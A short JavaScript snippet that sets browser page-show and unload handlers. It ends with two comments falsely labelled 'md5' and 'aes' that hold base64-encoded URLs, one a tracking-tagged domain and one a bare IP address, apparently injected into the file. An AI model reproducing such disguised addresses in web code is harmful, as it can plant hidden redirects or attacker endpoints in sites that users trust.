if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuY3hmdnFvci5jb20vP3F1ZGFvPTM5ZDQwMzc3LWIxNmItYmVlYi1kYTcyLWUxZTQ4YzQ5MzBjNQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/